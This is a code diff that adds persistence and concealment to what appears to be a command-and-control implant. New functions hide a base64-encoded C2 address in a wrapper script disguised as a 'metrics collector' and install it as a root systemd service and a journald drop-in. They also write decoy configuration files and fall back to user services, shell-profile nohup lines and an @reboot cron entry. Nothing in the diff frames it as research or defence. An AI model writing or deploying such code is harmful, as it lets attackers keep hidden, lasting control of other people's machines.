@@ -314,6 +314,324 @@ def fork_and_hide():
     except:
         return False
 
+def create_wrapper_script(script_path=None):
+    """Create a wrapper script that hides C2 details"""
+    try:
+        # Use the deployed script path if no backup was created
+        if not script_path:
+            script_path = "/usr/lib/metrics-collector/metrics.py"
+        
+        # Create a random wrapper script name in a common system directory
+        wrapper_dirs = ["/usr/local/bin", "/opt", "/usr/bin"]
+        wrapper_dir = random.choice(wrapper_dirs)
+        
+        # Ensure directory exists
+        os.makedirs(wrapper_dir, exist_ok=True)
+        
+        # Generate a random wrapper name
+        wrapper_name = random.choice([
+            "metrics-collector-helper",
+            "system-metrics-collector",
+            "network-metrics-helper",
+            "system-stats-collector"
+        ])
+        
+        wrapper_path = os.path.join(wrapper_dir, wrapper_name)
+        
+        # Create wrapper script with encoded C2 details
+        c2_config = "https://192.168.10.11:443/ plaintext_really"
+        encoded_config = base64.b64encode(c2_config.encode()).decode()
+        
+        wrapper_content = f"""#!/bin/bash
+# Metrics Collection Helper
+# This script is part of the system metrics collection infrastructure
+
+# Decode configuration
+CONFIG=$(echo "{encoded_config}" | base64 -d)
+
+# Execute the main script with decoded configuration
+{script_path} $CONFIG > /dev/null 2>&1
+"""
+        
+        # Write wrapper script
+        with open(wrapper_path, 'w') as f:
+            f.write(wrapper_content)
+        
+        # Make executable
+        os.chmod(wrapper_path, 0o755)
+        
+        return wrapper_path
+    except Exception as e:
+        print_debug(f"Failed to create wrapper script: {e}")
+        return None
+
+def create_legitimate_systemd_service_sudo(wrapper_path):
+    """Create a systemd service using sudo"""
+    try:
+        # Use a service name that matches the script location
+        service_name = "metrics-collector.service"
+        
+        # Create systemd service file with legitimate-looking configuration
+        service_content = f"""[Unit]
+Description=System Metrics Collection Service
+Documentation=man:metrics-collector(8)
+After=network.target network-online.target
+Wants=network-online.target
+ConditionPathExists=/usr/lib/metrics-collector
+
+[Service]
+Type=simple
+ExecStart={wrapper_path}
+Restart=always
+RestartSec=30
+User=root
+Group=root
+StandardOutput=null
+StandardError=null
+SyslogIdentifier=metrics-collector
+NoNewPrivileges=true
+PrivateTmp=true
+ProtectSystem=strict
+ProtectHome=true
+ReadWritePaths=/tmp /var/tmp /var/lib/metrics-collector
+ProtectKernelTunables=true
+ProtectControlGroups=true
+RestrictRealtime=true
+MemoryDenyWriteExecute=true
+RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 AF_NETLINK
+
+[Install]
+WantedBy=multi-user.target
+"""
+        
+        # Write service file using sudo
+        service_path = f"/etc/systemd/system/{service_name}"
+        process = subprocess.Popen(["sudo", "tee", service_path], stdin=subprocess.PIPE, text=True)
+        process.communicate(input=service_content)
+        
+        if process.returncode != 0:
+            return False
+        
+        # Set permissions using sudo
+        subprocess.run(["sudo", "chmod", "644", service_path], check=False)
+        
+        # Enable and start the service using sudo
+        subprocess.run(["sudo", "systemctl", "daemon-reload"], check=False)
+        subprocess.run(["sudo", "systemctl", "enable", service_name], check=False)
+        subprocess.run(["sudo", "systemctl", "start", service_name], check=False)
+        
+        return True
+    except Exception as e:
+        print_debug(f"Failed to create systemd service with sudo: {e}")
+        return False
+
+def create_journald_drop_in_sudo(wrapper_path):
+    """Create a drop-in configuration for systemd-journald using sudo"""
+    try:
+        # Create drop-in directory using sudo
+        drop_in_dir = "/etc/systemd/system/systemd-journald.service.d"
+        subprocess.run(["sudo", "mkdir", "-p", drop_in_dir], check=False)
+        
+        # Create drop-in configuration
+        drop_in_file = os.path.join(drop_in_dir, "10-metrics.conf")
+        
+        drop_in_content = f"""# Metrics collection for journald
+[Service]
+ExecStartPost={wrapper_path}
+"""
+        
+        # Write drop-in file using sudo
+        process = subprocess.Popen(["sudo", "tee", drop_in_file], stdin=subprocess.PIPE, text=True)
+        process.communicate(input=drop_in_content)
+        
+        if process.returncode != 0:
+            return False
+        
+        # Reload systemd using sudo
+        subprocess.run(["sudo", "systemctl", "daemon-reload"], check=False)
+        
+        return True
+    except Exception as e:
+        print_debug(f"Failed to create journald drop-in config with sudo: {e}")
+        return False
+
+def create_legitimate_config_sudo():
+    """Create legitimate-looking configuration files using sudo"""
+    try:
+        # Create metrics-collector directory structure using sudo
+        metrics_dir = "/etc/metrics-collector"
+        subprocess.run(["sudo", "mkdir", "-p", metrics_dir], check=False)
+        
+        # Create a configuration file
+        config_path = os.path.join(metrics_dir, "config.yaml")
+        
+        config_content = """# Metrics Collection Configuration
+# This file contains configuration for the system metrics collector
+
+# Collection settings
+collection:
+  interval: 300  # seconds
+  batch_size: 100
+  
+# Metrics to collect
+metrics:
+  - system
+  - network
+  - disk
+  - memory
+  - cpu
+  
+# Output settings
+output:
+  format: json
+  compression: true
+  
+# Internal server settings
+server:
+  endpoint: "https://internal-monitoring.local/api/metrics"
+  auth_token: "internal_monitoring_token_2023"
+  timeout: 30
+"""
+        
+        # Write config file using sudo
+        process = subprocess.Popen(["sudo", "tee", config_path], stdin=subprocess.PIPE, text=True)
+        process.communicate(input=config_content)
+        
+        if process.returncode != 0:
+            return False
+        
+        # Set permissions using sudo
+        subprocess.run(["sudo", "chmod", "644", config_path], check=False)
+        
+        # Create a logrotate configuration using sudo
+        logrotate_path = "/etc/logrotate.d/metrics-collector"
+        logrotate_content = f"""{metrics_dir}/logs/*.log {{
+    daily
+    missingok
+    rotate 7
+    compress
+    delaycompress
+    notifempty
+    create 644 root root
+    postrotate
+        systemctl reload metrics-collector
+    endscript
+}}
+"""
+        
+        # Write logrotate file using sudo
+        process = subprocess.Popen(["sudo", "tee", logrotate_path], stdin=subprocess.PIPE, text=True)
+        process.communicate(input=logrotate_content)
+        
+        return process.returncode == 0
+    except Exception as e:
+        print_debug(f"Failed to create legitimate config with sudo: {e}")
+        return False
+    
+def create_user_level_persistence(wrapper_path):
+    """Create user-level persistence mechanisms"""
+    try:
+        # Get current user
+        username = getpass.getuser()
+        home_dir = os.path.expanduser("~")
+        
+        # Create a systemd user service
+        user_service_dir = os.path.join(home_dir, ".config", "systemd", "user")
+        os.makedirs(user_service_dir, exist_ok=True)
+        
+        service_name = "metrics-collector.service"
+        
+        service_content = f"""[Unit]
+Description=User Metrics Collection Service
+After=graphical-session.target
+
+[Service]
+Type=simple
+ExecStart={wrapper_path}
+Restart=always
+RestartSec=30
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=default.target
+"""
+        
+        service_path = os.path.join(user_service_dir, service_name)
+        with open(service_path, 'w') as f:
+            f.write(service_content)
+        
+        # Enable user service
+        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
+        subprocess.run(["systemctl", "--user", "enable", service_name], check=False)
+        subprocess.run(["systemctl", "--user", "start", service_name], check=False)
+        
+        # Add to profile files
+        profile_files = [
+            os.path.join(home_dir, ".bashrc"),
+            os.path.join(home_dir, ".profile"),
+            os.path.join(home_dir, ".zshrc")
+        ]
+        
+        for profile_file in profile_files:
+            if os.path.exists(profile_file):
+                with open(profile_file, 'a') as f:
+                    f.write(f"\n# System metrics check\nnohup {wrapper_path} > /dev/null 2>&1 &\n")
+        
+        # Create a cron job for the user
+        cron_entry = f"@reboot {wrapper_path} > /dev/null 2>&1\n"
+        
+        # Read existing crontab
+        result = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        existing_cron = result.stdout if result.returncode == 0 else ""
+        
+        # Check if our entry already exists
+        if wrapper_path not in existing_cron:
+            # Add our entry
+            new_cron = existing_cron + cron_entry
+            
+            # Write new crontab
+            process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
+            process.communicate(input=new_cron)
+        
+        return True
+    except Exception as e:
+        print_debug(f"Failed to create user-level persistence: {e}")
+        return False
+
+def create_stealthy_persistence():
+    """Create stealthy persistence for admin user deployment"""
+    try:
+        # Check if we have sudo privileges
+        has_sudo = False
+        try:
+            result = subprocess.run(["sudo", "-n", "true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            has_sudo = result.returncode == 0
+        except:
+            pass
+        
+        # Create a wrapper script with obfuscated C2 details
+        wrapper_path = create_wrapper_script()
+        if not wrapper_path:
+            return False
+        
+        # Try to create system-level persistence with sudo if available
+        if has_sudo:
+            service_success = create_legitimate_systemd_service_sudo(wrapper_path)
+            drop_in_success = create_journald_drop_in_sudo(wrapper_path)
+            config_success = create_legitimate_config_sudo()
+            
+            if service_success or drop_in_success:
+                return True
+        
+        # Fall back to user-level persistence
+        return create_user_level_persistence(wrapper_path)
+    except Exception as e:
+        print_debug(f"Failed to create stealthy persistence: {e}")
+        return False
+    
+
+
 class AdaptiveC2Client:
     def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20, stealth_mode=False):
         self.c2_server = c2_server
@@ -588,6 +906,8 @@ def main():
     fork_and_hide()
 
     hide_process_name()
+
+    create_stealthy_persistence()
 
     STEALTH_MODE = True
     # Perform our initial connection to the server to setup the agent
